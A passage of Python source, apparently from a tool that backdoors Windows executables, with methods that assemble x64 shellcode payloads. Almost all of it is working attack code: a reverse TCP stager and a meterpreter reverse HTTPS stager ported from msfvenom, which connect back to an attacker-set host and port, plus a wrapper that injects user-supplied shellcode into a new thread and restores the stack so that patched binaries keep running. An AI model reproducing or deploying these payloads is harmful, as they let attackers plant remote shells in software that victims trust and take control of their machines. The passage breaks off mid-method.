    def reverse_tcp_stager_threaded(self):
        """
        Ported the x32 payload from msfvenom for patching win32 binaries (shellcode1)
        with the help of Steven Fewer's work on msf win64 payloads.
        windows/x64/shell/reverse_tcp - 422 bytes (stage 1)
        windows/x64/meterpreter/reverse_tcp will work with this
        """

        # overloading the class stackpreserve
        self.stackpreserve = (b"\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              b"\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        self.shellcode2 = b"\xE8\xB8\xFF\xFF\xFF"
        # Payload
        self.shellcode2 += (b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                            b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                            b"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                            b"\x49\x89\xe5\x49\xbc\x02\x00"
                            )
        self.shellcode2 += struct.pack('!H', self.port)
        self.shellcode2 += self.__pack_ip_addresses()
        self.shellcode2 += (b"\x41\x54"
                            b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            b"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            b"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            b"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            b"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            b"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec"
                            b"\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41"
                            b"\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41"
                            b"\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41"
                            b"\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
                            b"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8"
                            b"\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41"
                            b"\xff\xe7"
                            )

        self.shellcode1 = (b"\x90"                              # <--THAT'S A NOP. \o/
                           b"\xe8\xc0\x00\x00\x00"              # jmp to allocate
                           # api_call
                           b"\x41\x51"                          # push r9
                           b"\x41\x50"                          # push r8
                           b"\x52"                              # push rdx
                           b"\x51"                              # push rcx
                           b"\x56"                              # push rsi
                           b"\x48\x31\xD2"                      # xor rdx,rdx
                           b"\x65\x48\x8B\x52\x60"              # mov rdx,qword ptr gs:[rdx+96]
                           b"\x48\x8B\x52\x18"                  # mov rdx,qword ptr [rdx+24]
                           b"\x48\x8B\x52\x20"                  # mov rdx,qword ptr[rdx+32]
                           # next_mod
                           b"\x48\x8b\x72\x50"                  # mov rsi,[rdx+80]
                           b"\x48\x0f\xb7\x4a\x4a"              # movzx rcx,word [rdx+74]
                           b"\x4d\x31\xc9"                      # xor r9,r9
                           # loop_modname
                           b"\x48\x31\xc0"                      # xor rax,rax
                           b"\xac"                              # lods
                           b"\x3c\x61"                          # cmp al, 61h (a)
                           b"\x7c\x02"                          # jl 02
                           b"\x2c\x20"                          # sub al, 0x20
                           # not_lowercase
                           b"\x41\xc1\xc9\x0d"                  # ror r9d, 13
                           b"\x41\x01\xc1"                      # add r9d, eax
                           b"\xe2\xed"                          # loop until read, back to xor rax, rax
                           b"\x52"                              # push rdx ; Save the current pos in the module list
                           b"\x41\x51"                          # push r9 ; Save the current module hash for later
                                                                # ; Proceed to itterate the export address table,
                           b"\x48\x8b\x52\x20"                  # mov rdx, [rdx+32] ; Get this modules base address
                           b"\x8b\x42\x3c"                      # mov eax, dword [rdx+60] ; Get PE header
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           b"\x8b\x80\x88\x00\x00\x00"          # mov eax, dword [rax+136] ; Get export tables RVA
                           b"\x48\x85\xc0"                      # test rax, rax; Test if no export addr table is present
                           b"\x74\x67"                          # je get_next_mod1 ; If no EAT present, process next
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           b"\x50"                              # push rax ; Save the current modules EAT
                           b"\x8b\x48\x18"                      # mov ecx, dword [rax+24] ; Get the number of function
                           b"\x44\x8b\x40\x20"                  # mov r8d, dword [rax+32] ; Get the rva of the function
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                                                                # ; Computing the module hash + function hash
                           # get_next_func: ;
                           b"\xe3\x56"                          # jrcxz get_next_mod; When we reach the start of the EAT
                           b"\x48\xff\xc9"                      # dec rcx ; Decrement the function name counter
                           b"\x41\x8b\x34\x88"                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
                           b"\x48\x01\xd6"                      # add rsi, rdx ; Add the modules base address
                           b"\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash
                                                                #  ; of the function and compare it to the one we want
                           # loop_funcname: ;
                           b"\x48\x31\xc0"                      # xor rax, rax ; Clear rax
                           b"\xac"                              # lodsb ; Read in the next byte of the ASCII function
                           b"\x41\xc1\xc9\x0d"                  # ror r9d, 13 ; Rotate right our hash value
                           b"\x41\x01\xc1"                      # add r9d, eax ; Add the next byte of the name
                           b"\x38\xe0"                          # cmp al, ah ; Compare AL (the next of the name) to AH
                           b"\x75\xf1"                          # jne loop_funcname ; not reached the null terminator
                           b"\x4c\x03\x4c\x24\x08"              # add r9, [rsp+8] ; Add current module hash to the hash
                           b"\x45\x39\xd1"                      # cmp r9d, r10d ; Compare the hash
                           b"\x75\xd8"                          # jnz get_next_func ; Go compute the next function hash
                                                                # ; If found, fix up stack, call the function
                           b"\x58"                              # pop rax ; Restore the current modules EAT
                           b"\x44\x8b\x40\x24"                  # mov r8d, dword [rax+36] ; Get the ordinal table rva
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           b"\x66\x41\x8b\x0c\x48"              # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                           b"\x44\x8b\x40\x1c"                  # mov r8d, dword [rax+28] ; function addresses table rva
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           b"\x41\x8b\x04\x88"                  # mov eax, dword [r8+4*rcx];Get the desired funct. RVA
                           b"\x48\x01\xd0"                      # add rax, rdx; Add modules base addr, get functions VA
                                                                # ; We now fix up the stack and perform the call
                           # finish:
                           b"\x41\x58"                          # pop r8 ; Clear off the current modules hash
                           b"\x41\x58"                          # pop r8 ; Clear off the curr. pos. in the module list
                           b"\x5E"                              # pop rsi ; Restore RSI
                           b"\x59"                              # pop rcx ; Restore the 1st parameter
                           b"\x5A"                              # pop rdx ; Restore the 2nd parameter
                           b"\x41\x58"                          # pop r8 ; Restore the 3rd parameter
                           b"\x41\x59"                          # pop r9 ; Restore the 4th parameter
                           b"\x41\x5A"                          # pop r10 ; pop off the return address
                           b"\x48\x83\xEC\x20"                  # sub rsp, 32 ; reserve space for the register params

                           b"\x41\x52"                          # push r10 ; push back the return address
                           b"\xFF\xE0"                          # jmp rax ; Jump into the required function
                                                                # ; We now automagically return to the correct caller...
                           # get_next_mod:
                           b"\x58"                              # pop rax ; Pop off the current modules EAT
                           # get_next_mod1:
                           b"\x41\x59"                          # pop r9 ; Pop off the current modules hash
                           b"\x5A"                              # pop rdx ; Restore our position in the module list
                           b"\x48\x8B\x12"                      # mov rdx, [rdx] ; Get the next module
                           b"\xe9\x57\xff\xff\xff"              # jmp next_mod ; Process this module
                           )
        # allocate
        self.shellcode1 += (b"\x5d"                              # pop rbp
                            b"\x49\xc7\xc6")                     # mov r14, size of payload below
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
        self.shellcode1 += (b"\x6a\x40"                          # push 40h
                            b"\x41\x59"                          # pop r9 now 40h
                            b"\x68\x00\x10\x00\x00"              # push 1000h
                            b"\x41\x58"                          # pop r8.. now 1000h
                            b"\x4C\x89\xF2"                      # mov rdx, r14
                            b"\x6A\x00"                          # push 0
                            b"\x59"                              # pop rcx
                            b"\x68\x58\xa4\x53\xe5"              # push E553a458
                            b"\x41\x5A"                          # pop r10
                            b"\xff\xd5"                          # call rbp
                            b"\x48\x89\xc3"                      # mov rbx, rax      ; Store allocated address in ebx
                            b"\x48\x89\xc7"                      # mov rdi, rax      ; Prepare EDI with the new address
                            b"\x48\xC7\xC1"
                            )
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        self.shellcode1 += b"\xeb\x43"

        # got_payload:
        self.shellcode1 += (b"\x5e"                                  # pop rsi            ; Prepare ESI with the source
                            b"\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX mem
                            b"\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling

                            # set_handler:
                            b"\x48\x31\xC0"  # xor rax,rax

                            b"\x50"                          # push rax            ; LPDWORD lpThreadId (NULL)
                            b"\x50"                          # push rax            ; DWORD dwCreationFlags (0)
                            b"\x49\x89\xC1"                  # mov r9, rax         ; LPVOID lpParameter (NULL)
                            b"\x48\x89\xC2"                  # mov rdx, rax        ; LPTHREAD_START_ROUTINE  (payload)
                            b"\x49\x89\xD8"                  # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            b"\x48\x89\xC1"                  # mov rcx, rax        ; LPSECURITY_ATTRIBUTES (null)
                            b"\x49\xC7\xC2\x38\x68\x0D\x16"  # mov r10, 0x160D6838 ; hash("kernel32.dll","CreateThread")
                            b"\xFF\xD5"                      # call rbp            ; Spawn payload thread
                            b"\x48\x83\xC4\x58"              # add rsp, 50
                            # stackrestore
                            b"\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            b"\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )

        self.shellcode1 += b"\xe9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        return self.stackpreserve + self.shellcode1 + self.shellcode2

    def meterpreter_reverse_https_threaded(self):
        """
        Win64 version
        windows/x64/meterpreter/reverse_https
        """

        # overloading the class stackpreserve
        self.stackpreserve = (b"\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              b"\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )
        self.shellcode2 = b"\xE8\xB8\xFF\xFF\xFF"

        # payload
        self.shellcode2 += (b"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52"
                            b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            b"\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00"
                            b"\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b"
                            b"\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
                            b"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
                            b"\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
                            b"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b"
                            b"\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41"
                            b"\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41"
                            b"\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff"
                            b"\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56"
                            b"\x49\x89\xe6\x4c\x89\xf1\x49\xba\x4c\x77\x26\x07\x00\x00\x00"
                            b"\x00\xff\xd5\x6a\x00\x6a\x00\x48\x89\xe1\x48\x31\xd2\x4d\x31"
                            b"\xc0\x4d\x31\xc9\x41\x50\x41\x50\x49\xba\x3a\x56\x79\xa7\x00"
                            b"\x00\x00\x00\xff\xd5\xe9\x9e\x00\x00\x00\x5a\x48\x89\xc1\x49"
                            b"\xb8")
        self.shellcode2 += struct.pack("<H", self.port)
        self.shellcode2 += (b"\x00\x00\x00\x00\x00\x00\x4d\x31\xc9\x41\x51\x41"
                            b"\x51\x6a\x03\x41\x51\x49\xba\x57\x89\x9f\xc6\x00\x00\x00\x00"
                            b"\xff\xd5\xeb\x7c\x48\x89\xc1\x48\x31\xd2\x41\x58\x4d\x31\xc9"
                            b"\x52\x68\x00\x32\xa0\x84\x52\x52\x49\xba\xeb\x55\x2e\x3b\x00"
                            b"\x00\x00\x00\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x48"
                            b"\xba\x1f\x00\x00\x00\x00\x00\x00\x00\x6a\x00\x68\x80\x33\x00"
                            b"\x00\x49\x89\xe0\x49\xb9\x04\x00\x00\x00\x00\x00\x00\x00\x49"
                            b"\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5\x48\x89\xf1\x48"
                            b"\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x52\x52\x49\xba\x2d\x06\x18"
                            b"\x7b\x00\x00\x00\x00\xff\xd5\x85\xc0\x75\x24\x48\xff\xcf\x74"
                            b"\x13\xeb\xb1\xe9\x81\x00\x00\x00\xe8\x7f\xff\xff\xff\x2f\x75"
                            b"\x47\x48\x58\x00\x00\x49\xbe\xf0\xb5\xa2\x56\x00\x00\x00\x00"
                            b"\xff\xd5\x48\x31\xc9\x48\xba\x00\x00\x40\x00\x00\x00\x00\x00"
                            b"\x49\xb8\x00\x10\x00\x00\x00\x00\x00\x00\x49\xb9\x40\x00\x00"
                            b"\x00\x00\x00\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00\x00"
                            b"\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda"
                            b"\x49\xb8\x00\x20\x00\x00\x00\x00\x00\x00\x49\x89\xf9\x49\xba"
                            b"\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20\x85"
                            b"\xc0\x74\x99\x48\x8b\x07\x48\x01\xc3\x48\x85\xc0\x75\xce\x58"
                            b"\x58\xc3\xe8\xd7\xfe\xff\xff")
        self.shellcode2 += self.host.encode('Ascii')
        self.shellcode2 += b"\x00"

        self.shellcode1 = (b"\x90"                              # <--THAT'S A NOP. \o/
                           b"\xe8\xc0\x00\x00\x00"              # jmp to allocate
                           # api_call
                           b"\x41\x51"                          # push r9
                           b"\x41\x50"                          # push r8
                           b"\x52"                              # push rdx
                           b"\x51"                              # push rcx
                           b"\x56"                              # push rsi
                           b"\x48\x31\xD2"                      # xor rdx,rdx
                           b"\x65\x48\x8B\x52\x60"              # mov rdx,qword ptr gs:[rdx+96]
                           b"\x48\x8B\x52\x18"                  # mov rdx,qword ptr [rdx+24]
                           b"\x48\x8B\x52\x20"                  # mov rdx,qword ptr[rdx+32]
                           # next_mod
                           b"\x48\x8b\x72\x50"                  # mov rsi,[rdx+80]
                           b"\x48\x0f\xb7\x4a\x4a"              # movzx rcx,word [rdx+74]
                           b"\x4d\x31\xc9"                      # xor r9,r9
                           # loop_modname
                           b"\x48\x31\xc0"                      # xor rax,rax
                           b"\xac"                              # lods
                           b"\x3c\x61"                          # cmp al, 61h (a)
                           b"\x7c\x02"                          # jl 02
                           b"\x2c\x20"                          # sub al, 0x20
                           # not_lowercase
                           b"\x41\xc1\xc9\x0d"                  # ror r9d, 13
                           b"\x41\x01\xc1"                      # add r9d, eax
                           b"\xe2\xed"                          # loop until read, back to xor rax, rax
                           b"\x52"                              # push rdx ; Save the current position in the module lis
                           b"\x41\x51"                          # push r9 ; Save the current module hash for later
                                                                # ; Proceed to itterate the export address table,
                           b"\x48\x8b\x52\x20"                  # mov rdx, [rdx+32] ; Get this modules base address
                           b"\x8b\x42\x3c"                      # mov eax, dword [rdx+60] ; Get PE header
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           b"\x8b\x80\x88\x00\x00\x00"          # mov eax, dword [rax+136] ; Get export tables RVA
                           b"\x48\x85\xc0"                      # test rax, rax ; Test if no export addrtable is present
                           b"\x74\x67"                          # je get_next_mod1 ; If no EAT present, process next
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           b"\x50"                              # push rax ; Save the current modules EAT
                           b"\x8b\x48\x18"                      # mov ecx, dword [rax+24] ; Get the number of function
                           b"\x44\x8b\x40\x20"                  # mov r8d, dword [rax+32] ; Get the rva of the function
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address

                           # get_next_func: ;
                           b"\xe3\x56"                          # jrcxz get_next_mod; When we reach the start of the EAT
                           b"\x48\xff\xc9"                      # dec rcx ; Decrement the function name counter
                           b"\x41\x8b\x34\x88"                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
                           b"\x48\x01\xd6"                      # add rsi, rdx ; Add the modules base address
                           b"\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash
                                                                #  ; And compare it to the one we wan
                           # loop_funcname: ;
                           b"\x48\x31\xc0"                      # xor rax, rax ; Clear rax
                           b"\xac"                              # lodsb ; Read in the next byte of the ASCII function
                           b"\x41\xc1\xc9\x0d"                  # ror r9d, 13 ; Rotate right our hash value
                           b"\x41\x01\xc1"                      # add r9d, eax ; Add the next byte of the name
                           b"\x38\xe0"                          # cmp al, ah ; Compare AL to AH (null)
                           b"\x75\xf1"                          # jne loop_funcname ; continue
                           b"\x4c\x03\x4c\x24\x08"              # add r9, [rsp+8] ; Add the current module hash
                           b"\x45\x39\xd1"                      # cmp r9d, r10d ; Compare the hash
                           b"\x75\xd8"                          # jnz get_next_func ; Go compute the next function hash

                           b"\x58"                              # pop rax ; Restore the current modules EAT
                           b"\x44\x8b\x40\x24"                  # mov r8d, dword [rax+36] ; Get the ordinal table rva
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           b"\x66\x41\x8b\x0c\x48"              # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                           b"\x44\x8b\x40\x1c"                  # mov r8d, dword [rax+28] ; Get the funct addr.table rva
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           b"\x41\x8b\x04\x88"                  # mov eax, dword [r8+4*rcx]; Get the desired funcc RVA
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address to get VA

                           # finish:
                           b"\x41\x58"                          # pop r8 ; Clear off the current modules hash
                           b"\x41\x58"                          # pop r8 ; Clear off the current pos in the module list
                           b"\x5E"                              # pop rsi ; Restore RSI
                           b"\x59"                              # pop rcx ; Restore the 1st parameter
                           b"\x5A"                              # pop rdx ; Restore the 2nd parameter
                           b"\x41\x58"                          # pop r8 ; Restore the 3rd parameter
                           b"\x41\x59"                          # pop r9 ; Restore the 4th parameter
                           b"\x41\x5A"                          # pop r10 ; pop off the return address
                           b"\x48\x83\xEC\x20"                  # sub rsp, 32 ; reserve space for the register params

                           b"\x41\x52"                          # push r10 ; push back the return address
                           b"\xFF\xE0"                          # jmp rax ; Jump into the required function

                           # get_next_mod: ;
                           b"\x58"                              # pop rax ; Pop off the current modules EAT
                           # get_next_mod1: ;
                           b"\x41\x59"                          # pop r9 ; Pop off the current modules hash
                           b"\x5A"                              # pop rdx ; Restore our position in the module list
                           b"\x48\x8B\x12"                      # mov rdx, [rdx] ; Get the next module
                           b"\xe9\x57\xff\xff\xff"              # jmp next_mod ; Process this module
                           )
        # allocate
        self.shellcode1 += (b"\x5d"                              # pop rbp
                            b"\x49\xc7\xc6"                      # mov r14, 1abh size of payload...
                            )
        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)
        self.shellcode1 += (b"\x00\x00"
                            b"\x6a\x40"                          # push 40h
                            b"\x41\x59"                          # pop r9 now 40h
                            b"\x68\x00\x10\x00\x00"              # push 1000h
                            b"\x41\x58"                          # pop r8.. now 1000h
                            b"\x4C\x89\xF2"                      # mov rdx, r14
                            b"\x6A\x00"                          # push 0
                            b"\x59"                              # pop rcx
                            b"\x68\x58\xa4\x53\xe5"              # push E553a458
                            b"\x41\x5A"                          # pop r10
                            b"\xff\xd5"                          # call rbp
                            b"\x48\x89\xc3"                      # mov rbx, rax      ; Store allocated address in ebx
                            b"\x48\x89\xc7"                      # mov rdi, rax      ; Prepare EDI with the new address
                            )

        self.shellcode1 += b"\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)
        self.shellcode1 += b"\x00\x00"

        # Call the get_payload right before the payload
        self.shellcode1 += b"\xeb\x43"

        # got_payload:
        self.shellcode1 += (b"\x5e"                                  # pop rsi            ; Prepare ESI with the source
                            b"\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX mem
                            b"\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling

                            # set_handler:
                            b"\x48\x31\xC0"                  # xor rax,rax
                            b"\x50"                          # push rax            ; LPDWORD lpThreadId (NULL)
                            b"\x50"                          # push rax            ; DWORD dwCreationFlags (0)
                            b"\x49\x89\xC1"                  # mov r9, rax         ; LPVOID lpParameter (NULL)
                            b"\x48\x89\xC2"                  # mov rdx, rax        ; LPTHREAD_START_ROUTINE  (payload)
                            b"\x49\x89\xD8"                  # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            b"\x48\x89\xC1"                  # mov rcx, rax        ; LPSECURITY_ATTRIBUTES (NULL)
                            b"\x49\xC7\xC2\x38\x68\x0D\x16"  # mov r10, 0x160D6838 ; hash("kernel32.dll","CreateThread")
                            b"\xFF\xD5"                      # call rbp            ; Spawn payload thread
                            b"\x48\x83\xC4\x58"              # add rsp, 50
                            # stackrestore
                            b"\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            b"\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )

        self.shellcode1 += b"\xE9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        return self.stackpreserve + self.shellcode1 + self.shellcode2

    def demo_calc(self):
        """
        win64 start calc shellcode
        """
        return  (b"\x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x83\xEC"
                b"\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B"
                b"\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24"
                b"\x0F\xB7\x2C\x17\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F"
                b"\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4\x30\x5D\x5F\x5E"
                b"\x5B\x5A\x59\x58")
    
    def demo_nop(self):
        """
        just nop!
        """
        return b"\x90"
    
    def user_supplied_shellcode(self):
        """
        win64 raw/binary shellcode
        """

        return self.supplied_shellcode

    def user_supplied_shellcode_threaded(self):
        """
        User supplies the shellcode, make sure that it EXITs via a thread.
        """

        # overloading the class stackpreserve
        self.stackpreserve = (b"\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              b"\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        self.shellcode2 = b"\xE8\xB8\xFF\xFF\xFF"
        self.shellcode2 += self.supplied_shellcode

        self.shellcode1 = (b"\x90"                              # <--THAT'S A NOP. \o/
                           b"\xe8\xc0\x00\x00\x00"              # jmp to allocate
                           # api_call
                           b"\x41\x51"                          # push r9
                           b"\x41\x50"                          # push r8
                           b"\x52"                              # push rdx
                           b"\x51"                              # push rcx
                           b"\x56"                              # push rsi
                           b"\x48\x31\xD2"                      # xor rdx,rdx
                           b"\x65\x48\x8B\x52\x60"              # mov rdx,qword ptr gs:[rdx+96]
                           b"\x48\x8B\x52\x18"                  # mov rdx,qword ptr [rdx+24]
                           b"\x48\x8B\x52\x20"                  # mov rdx,qword ptr[rdx+32]
                           # next_mod
                           b"\x48\x8b\x72\x50"                  # mov rsi,[rdx+80]
                           b"\x48\x0f\xb7\x4a\x4a"              # movzx rcx,word [rdx+74]
                           b"\x4d\x31\xc9"                      # xor r9,r9
                           # loop_modname
                           b"\x48\x31\xc0"                      # xor rax,rax
                           b"\xac"                              # lods
                           b"\x3c\x61"                          # cmp al, 61h (a)
                           b"\x7c\x02"                          # jl 02
                           b"\x2c\x20"                          # sub al, 0x20
                           # not_lowercase
                           b"\x41\xc1\xc9\x0d"                  # ror r9d, 13
                           b"\x41\x01\xc1"                      # add r9d, eax
                           b"\xe2\xed"                          # loop until read, back to xor rax, rax
                           b"\x52"                              # push rdx ;Save the current position in the module list
                           b"\x41\x51"                          # push r9 ; Save the current module hash for later
                                                                # ; Proceed to itterate the export address table,
                           b"\x48\x8b\x52\x20"                  # mov rdx, [rdx+32] ; Get this modules base address
                           b"\x8b\x42\x3c"                      # mov eax, dword [rdx+60] ; Get PE header
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           b"\x8b\x80\x88\x00\x00\x00"          # mov eax, dword [rax+136] ; Get export tables RVA
                           b"\x48\x85\xc0"                      # test rax, rax ; Test if no export address table
                           b"\x74\x67"                          # je get_next_mod1 ; If no EAT present, process the nex
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           b"\x50"                              # push rax ; Save the current modules EAT
                           b"\x8b\x48\x18"                      # mov ecx, dword [rax+24] ; Get the number of function
                           b"\x44\x8b\x40\x20"                  # mov r8d, dword [rax+32] ; Get the rva of the function
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address

                           # get_next_func: ;
                           b"\xe3\x56"                          # jrcxz get_next_mod; When we reach the start of the EAT
                           b"\x48\xff\xc9"                      # dec rcx ; Decrement the function name counter
                           b"\x41\x8b\x34\x88"                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
                           b"\x48\x01\xd6"                      # add rsi, rdx ; Add the modules base address
                           b"\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash
                                                                #  ; And compare it to the one we wan
                           # loop_funcname: ;
                           b"\x48\x31\xc0"                      # xor rax, rax ; Clear rax
                           b"\xac"                              # lodsb ; Read in the next byte of the ASCII funct name
                           b"\x41\xc1\xc9\x0d"                  # ror r9d, 13 ; Rotate right our hash value
                           b"\x41\x01\xc1"                      # add r9d, eax ; Add the next byte of the name
                           b"\x38\xe0"                          # cmp al, ah ; Compare AL to AH (null)
                           b"\x75\xf1"                          # jne loop_funcname ; continue
                           b"\x4c\x03\x4c\x24\x08"              # add r9, [rsp+8] ; Add the current module hash
                           b"\x45\x39\xd1"                      # cmp r9d, r10d ; Compare the hash
                           b"\x75\xd8"                          # jnz get_next_func ; Go compute the next function hash

                           b"\x58"                              # pop rax ; Restore the current modules EAT
                           b"\x44\x8b\x40\x24"                  # mov r8d, dword [rax+36] ; Get the ordinal table rva
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           b"\x66\x41\x8b\x0c\x48"              # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                           b"\x44\x8b\x40\x1c"                  # mov r8d, dword [rax+28] ; Get the funct addr table rva
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           b"\x41\x8b\x04\x88"                  # mov eax, dword [r8+4*rcx]; Get the desired func RVA
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address

                           # finish:
                           b"\x41\x58"                          # pop r8 ; Clear off the current modules hash
